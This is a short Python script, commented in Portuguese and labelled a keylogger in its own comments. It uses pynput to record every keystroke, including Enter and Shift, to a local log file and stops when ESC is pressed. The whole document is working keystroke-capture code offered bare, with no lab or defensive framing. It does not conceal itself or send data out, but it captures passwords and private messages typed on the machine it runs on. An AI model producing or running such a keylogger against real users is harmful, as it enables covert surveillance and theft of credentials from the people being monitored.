import os
import pynput
from pynput.keyboard import Key, Listener
from datetime import datetime

# Diretório onde os dados serão armazenados
log_dir = "logs"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Arquivo de log
log_file = os.path.join(log_dir, "log.txt")

# Função para escrever no arquivo de log
def write_log(text):
    with open(log_file, "a") as f:
        f.write(text)

# Função chamada quando uma tecla é pressionada
def on_press(key):
    try:
        # Registro de teclas alfanuméricas
        if hasattr(key, 'char') and key.char is not None:
            write_log(key.char)
        else:
            # Registro de teclas especiais (e.g., Enter, Shift)
            write_log(f'[{key}]')
    except Exception as e:
        print(f"Erro ao gravar tecla: {e}")

# Função chamada quando uma tecla é liberada
def on_release(key):
    # Se a tecla 'ESC' for pressionada, para o keylogger
    if key == Key.esc:
        return False

# Inicializa e inicia o listener do teclado
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


